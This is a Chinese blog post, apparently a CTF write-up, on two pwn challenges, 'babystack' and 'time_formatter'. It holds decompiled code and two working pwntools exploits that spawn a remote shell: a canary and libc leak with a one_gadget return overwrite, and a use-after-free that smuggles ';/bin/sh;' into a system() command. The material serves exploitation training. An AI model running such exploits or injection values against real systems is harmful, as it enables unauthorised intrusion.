@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        攻防世界-babystack&amp;timeformatter - 一筐萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 你若盛开，清风自来！ </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            <i>一筐萝卜</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#babystack"><span class="toc-text">babystack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#time-formatter"><span class="toc-text">time_formatter</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        攻防世界-babystack&amp;timeformatter
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-07-27 18:58:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#WP" title="WP">WP</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content no-indent">
+        <h2 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h2><p>首先查看程序开启的保护<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">一筐萝卜➜ ctf  checksec --file babystack</span><br><span class="line">[*] '/root/ctf/babystack'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">一筐萝卜➜ ctf</span><br></pre></td></tr></table></figure></p>
+<p>拖到IDA分析</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    meau();</span><br><span class="line">    v3 = read_number();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        read(<span class="number">0</span>, &amp;s, <span class="number">0x100</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sub_400826(<span class="string">"invalid choice"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_400826((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_400AE7);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>菜单题，首先要搞清楚每一个选项中做了什么</p>
+<ul>
+<li>选项1，read读入0x100长度的字符串到变量s中（存在栈溢出）</li>
+<li>选项2，将读入的s字符串puts出来</li>
+<li>选项3，<code>return 0</code>退出程序</li>
+</ul>
+<p>综上所述，该程序存在栈溢出，但是溢出的长度不够长，只能覆盖到ret地址，一开始我以为是先迁移栈，再进行ROP攻击，后来突然灵机一动，想起了<code>one_gadget</code>，那么只要将ret地址覆盖到<code>one_gadget</code>就可以了，首先泄露libc基地址，利用read栈溢出和puts输入可以将canary和libc给泄露出来，然后覆盖返回地址就可以了</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">file = ELF(<span class="string">"./babystack"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"><span class="comment"># r = process("./babystack")</span></span><br><span class="line">r = remote(<span class="string">"111.198.29.45"</span>,<span class="number">55784</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line"></span><br><span class="line">pay1 = <span class="string">"a"</span>*(<span class="number">0x90</span><span class="number">-8</span>+<span class="number">1</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.send(pay1)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>)</span><br><span class="line">canary =  <span class="string">"\x00"</span>+data[<span class="number">-8</span>:<span class="number">-1</span>]</span><br><span class="line">log.info(<span class="string">"canary : "</span>+canary)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x98</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line">str1 = r.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>)</span><br><span class="line">leak_addr = u64(str1[<span class="number">-6</span>:]+<span class="string">"\x00\x00"</span>)</span><br><span class="line">log.info(<span class="string">"leak_addr:"</span>+hex(leak_addr))</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">libc_start_main_240 = libc.symbols[<span class="string">'__libc_start_main'</span>]+<span class="number">240</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"libc_start_main_240:"</span>+hex(libc_start_main_240))</span><br><span class="line">base_addr = leak_addr-libc_start_main_240</span><br><span class="line">log.info(<span class="string">"base_addr:"</span>+hex(base_addr))</span><br><span class="line"></span><br><span class="line">one_gg = <span class="number">0xf1147</span>+base_addr</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"one_gg:"</span>+hex(one_gg))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"b"</span>*<span class="number">0x88</span>+canary+<span class="string">"a"</span>*<span class="number">8</span>+p64(one_gg)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">r.sendline(<span class="string">"3"</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+<h2 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time_formatter"></a>time_formatter</h2><p>查保护</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一筐萝卜➜ ctf  checksec --file time_formatter </span><br><span class="line">[*] '/root/ctf/time_formatter'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br><span class="line">一筐萝卜➜ ctf</span><br></pre></td></tr></table></figure>
+<p>拖入IDA分析代码</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__gid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  FILE *v4; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = getegid();</span><br><span class="line">  setresgid(v3, v3, v3);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to Mary's Unix Time Formatter!"</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"1) Set a time format."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"2) Set a time."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"3) Set a time zone."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"4) Print your time."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"5) Exit."</span>);</span><br><span class="line">      __printf_chk(<span class="number">1L</span>L, <span class="string">"&gt; "</span>);</span><br><span class="line">      v4 = <span class="built_in">stdout</span>;</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      <span class="keyword">switch</span> ( sub_400D26() )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          v6 = setformat();                     <span class="comment">// set myformat</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          v6 = settime();                       <span class="comment">// set mystr</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          v6 = sub_400E43();                    <span class="comment">// set value</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">          v6 = Print(v4, <span class="string">"&gt; "</span>, v5);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">          v6 = Exit();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !v6 );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>同样时菜单题</p>
+<ul>
+<li>选项1，输入一个format，但是有字符限制，<code>%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^#</code></li>
+<li>选项2，输入一个time</li>
+<li>选项3，输入一个<code>time zone</code></li>
+<li>选项4，通过<code>__snprintf_chk</code>函数将刚刚输进去的字符串拼接起来，样式<code>/bin/date -d @%d +&#39;%s&#39;</code>，<code>%d</code>、<code>%s</code>分别对应的是<code>my_str</code>、<code>my_format</code></li>
+<li>选项5，调用<code>sub_400C7E</code>处理<code>my_str</code>、<code>my_format</code>，而<code>sub_400C7E</code>里面调用的时<code>free</code>函数，从而推断出存放<code>my_str</code>、<code>my_format</code>的内存是堆</li>
+</ul>
+<p>但是在plt表中没有找到向malloc之类分配堆的函数，但是多了几个之前没见过的函数，一一百度他们的函数意义</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>strspn</td>
+<td>函数说明 strspn()从参数s 字符串的开头计算连续的字符，而这些字符都完全是accept 所指字符串中的字符。简单的说，若strspn()返回的数值为n，则代表字符串s 开头连续有n 个字符都是属于字符串accept内的字符</td>
+</tr>
+<tr>
+<td>strcspn</td>
+<td>函数说明：strcspn()从参数s 字符串的开头计算连续的字符，而这些字符都完全不在参数reject 所指的字符串中。简单地说， 若strcspn()返回的数值为n，则代表字符串s 开头连续有n 个字符都不含字符串reject 内的字符。</td>
+</tr>
+<tr>
+<td>strdup</td>
+<td>strdup()在内部调用了malloc()为变量分配内存，不需要使用返回的字符串时，需要用free()释放相应的内存空间，否则会造成内存泄漏。</td>
+</tr>
+</tbody>
+</table>
+<p>可以看出，strdup函数内部调用了malloc，从而给字符串开辟了内存</p>
+<p>这一切仿佛是那么正常，但是在选项5的函数中，被free的chunk没有指向Null，从而造成了UAF漏洞</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">Exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_400C7E(my_format);</span><br><span class="line">  sub_400C7E(value);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Are you sure you want to exit (y/N)? "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( (s &amp; <span class="number">0xDF</span>) == <span class="string">'Y'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"OK, exiting."</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在Print函数中调用了system函数，函数的参数command字符串，command中可控的变量有my_format、my_str，而my_format是有限制的，所以只剩下my_str我们可以控制，但是my_str对应的格式话字符串是<code>%d</code>，会转变成数字，同样我们不可以利用my_str，只有my_format是原封不动的到command，但是my_format有限制，那么就要绕过，通过UAF来构造my_format的chunk变成value，可以编辑</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"111.198.29.45"</span>, <span class="number">56048</span>)</span><br><span class="line"><span class="comment"># r = process("./time_formatter")</span></span><br><span class="line">r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Format: "</span>)</span><br><span class="line">r.sendline(<span class="string">"%c"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">r.sendline(<span class="string">"3"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Time zone: "</span>)</span><br><span class="line">r.sendline(<span class="string">"aaa"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Are you sure you want to exit (y/N)? "</span>)</span><br><span class="line">r.sendline(<span class="string">"N"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">r.sendline(<span class="string">"3"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Time zone: "</span>)</span><br><span class="line">r.sendline(<span class="string">"aaa"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">r.sendline(<span class="string">"3"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Time zone: "</span>)</span><br><span class="line">r.sendline(<span class="string">"\';/bin/sh;\'"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">r.sendline(<span class="string">"4"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
